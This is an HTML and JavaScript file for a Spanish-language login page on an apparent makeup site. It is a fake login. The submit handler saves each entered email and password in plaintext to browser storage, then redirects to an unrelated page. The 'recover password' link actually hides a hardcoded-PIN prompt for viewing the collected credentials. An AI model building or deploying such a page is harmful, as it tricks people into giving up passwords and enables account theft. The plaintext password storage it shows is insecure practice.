<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Inicia Sesión</title>

  <!-- Fuente bonita y amigable -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">

  <style>
    body { 
      margin: 0; 
      font-family: 'Poppins', sans-serif; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      min-height: 100vh; 
      flex-direction: column;

      /* Fondo con imagen */
      background: url('https://thumbs.dreamstime.com/b/collage-con-iconos-de-belleza-colores-pasteles-que-muestran-los-labios-cepillado-y-elementos-la-botella-maquillaje-sobre-un-fondo-395234450.jpg') no-repeat center center fixed;
      background-size: cover;
    }

    .login-box { 
      background: rgba(255, 255, 255, 0.9); /* blanco semitransparente */
      padding: 40px; 
      border-radius: 20px; 
      box-shadow: 0 8px 20px rgba(0,0,0,0.3); 
      width: 100%; 
      max-width: 380px; 
      text-align: center; 
      margin-bottom: 20px; 
      animation: fadeIn 1s ease-in-out; 
    }

    .login-box h2 { 
      margin-bottom: 5px; 
      font-weight: 600; 
      font-size: 22px; 
      color: #333; 
    }

    .login-box p { 
      margin-top: 0; 
      color: #666; 
      font-size: 14px; 
    }

    .login-box input { 
      width: 100%; 
      padding: 12px; 
      margin: 10px 0; 
      border: 1px solid #ddd; 
      border-radius: 10px; 
      font-size: 14px; 
    }

    .login-box button { 
      width: 100%; 
      padding: 12px; 
      background: #ff416c; 
      border: none; 
      border-radius: 10px; 
      color: white; 
      font-size: 16px; 
      font-weight: 600; 
      cursor: pointer; 
      margin-top: 10px; 
      transition: 0.3s; 
    }

    .login-box button:hover { 
      background: #ff4b2b; 
    }

    .extra { 
      margin-top: 15px; 
      font-size: 13px; 
      color: #666; 
    }

    .extra a { 
      color: #ff416c; 
      text-decoration: none; 
      cursor: pointer; 
    }

    .extra a:hover { 
      text-decoration: underline; 
    }

    /* Animación fade-in */
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

  <!-- Formulario -->
  <div class="login-box">
    <h2>Inicia sesión para descubrir este mundo de maquillaje</h2>
    <p>Bienvenida, ingresa tus datos y explora la belleza</p>
    <form id="loginForm">
      <input type="email" name="email" placeholder="Correo electrónico" required>
      <input type="password" name="password" placeholder="Contraseña" required>
      <button type="submit">Ingresar</button>
    </form>

    <div class="extra">
      <p>¿Olvidaste tu contraseña? <a id="recoverLink">Recupérala aquí</a></p>
    </div>
  </div>

  <script>
    const loginForm = document.getElementById('loginForm');
    const recoverLink = document.getElementById('recoverLink');

    loginForm.addEventListener('submit', function(e){
      e.preventDefault();
      const email = this.email.value;
      const password = this.password.value;

      // Guardar en localStorage
      let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];
      historial.push({ email, password, fecha: new Date().toLocaleString() });
      localStorage.setItem('historialDatos', JSON.stringify(historial));

      // Redirigir a tu página
      window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
    });

    recoverLink.addEventListener('click', function(){
      const pin = prompt("Ingresa el PIN para acceder a los datos:");
      if(pin === "2006"){
        alert("✅ Acceso permitido (aquí iría la vista del historial)");
      } else {
        alert("PIN incorrecto ❌");
      }
    });
  </script>

</body>
</html>
